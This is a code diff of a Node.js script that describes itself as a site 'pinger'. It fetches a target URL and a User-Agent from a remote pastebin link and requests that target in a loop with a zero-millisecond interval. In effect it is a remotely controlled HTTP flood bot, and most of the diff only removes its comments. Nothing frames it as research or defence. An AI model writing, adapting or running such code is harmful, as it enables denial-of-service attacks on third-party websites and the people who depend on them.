@@ -10,8 +10,6 @@ exec('npm install axios', (error, stdout, stderr) => {
     return;
   }
   console.log(`Package installed successfully.`);
-
-  // Code execution after package installation
   startScript();
 });
 
@@ -19,8 +17,8 @@ function startScript() {
   const axios = require('axios');
 
   const SITE_URL = 'YOUR_PASTEBIN_LINK';
-  const PING_INTERVAL = 0; // 1 second in milliseconds
-  const CHECK_INTERVAL = 5000; // 5 seconds in milliseconds;
+  const PING_INTERVAL = 0;
+  const CHECK_INTERVAL = 5000;
 
   let siteToPing;
   let pingIntervalId;
@@ -33,7 +31,7 @@ function startScript() {
 
       if (data.site === 'N/A') {
         console.log('No site available. Stopping pinging.');
-        clearInterval(pingIntervalId); // Stop pinging
+        clearInterval(pingIntervalId);
         return;
       }
 
@@ -56,7 +54,7 @@ function startScript() {
     try {
       await axios.get(siteToPing, {
         headers: {
-          'User-Agent': useragent, // Set the User-Agent header from the response
+          'User-Agent': useragent,
         },
       });
       console.log(`Site ${siteToPing} is up!`);
@@ -66,15 +64,12 @@ function startScript() {
   }
 
   function startPinging() {
-    pingSite(); // Start the initial ping
+    pingSite();
 
-    // Schedule subsequent pings
     pingIntervalId = setInterval(pingSite, PING_INTERVAL);
   }
 
-  // Start the initial check
   getSiteUrl();
 
-  // Schedule subsequent checks
   setInterval(getSiteUrl, CHECK_INTERVAL);
 }
